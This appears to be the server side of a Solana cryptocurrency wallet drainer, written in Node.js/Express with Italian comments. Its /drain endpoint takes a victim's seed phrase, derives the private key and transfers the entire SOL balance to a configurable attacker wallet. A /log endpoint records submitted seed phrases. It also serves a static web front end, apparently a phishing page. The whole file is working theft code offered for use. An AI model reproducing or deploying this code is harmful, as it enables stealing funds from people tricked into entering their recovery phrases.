import express from 'express';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Keypair } from '@solana/web3.js';
import { mnemonicToSeed } from 'bip39';
import { derivePath } from 'ed25519-hd-key';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json({ limit: '10mb' }));

// ===== CONFIGURAZIONE =====
const YOUR_RECEIVER_WALLET = 'IL_TUO_WALLET_PUBLIC_KEY'; // SOSTITUISCI
const connection = new Connection('https://api.mainnet-beta.solana.com');

// ===== DRENAGGIO =====
app.post('/drain', async (req, res) => {
  const { seed, walletPublicKey } = req.body;
  if (!seed || !walletPublicKey) {
    return res.status(400).json({ error: 'Dati mancanti' });
  }
  try {
    const seedBuffer = await mnemonicToSeed(seed);
    const derived = derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
    const fromKeypair = Keypair.fromSeed(derived.key);
    const fromPubkey = fromKeypair.publicKey;
    const toPubkey = new PublicKey(YOUR_RECEIVER_WALLET);

    const balance = await connection.getBalance(fromPubkey);
    const fee = 5000;
    const amount = balance - fee;
    let solTx = null;
    if (amount > 0) {
      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: fromPubkey,
          toPubkey: toPubkey,
          lamports: amount,
        })
      );
      solTx = await connection.sendTransaction(tx, [fromKeypair]);
      await connection.confirmTransaction(solTx);
    }

    res.json({
      status: 'drain_completed',
      from: fromPubkey.toString(),
      solTx: solTx,
      solAmount: amount / LAMPORTS_PER_SOL,
      tokenCount: 0
    });
  } catch (e) {
    console.error('Errore drenaggio:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// ===== LOG =====
app.post('/log', (req, res) => {
  console.log('📥 LOG:', req.body);
  if (req.body.seed) {
    console.log('⚠️ SEED RICEVUTA:', req.body.seed);
  }
  res.json({ status: 'ok' });
});

// ===== SERVE STATICO =====
app.use(express.static('dist'));

// ===== FALLBACK PER SPA =====
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(3000, () => console.log('🚀 Server in ascolto su http://localhost:3000'));
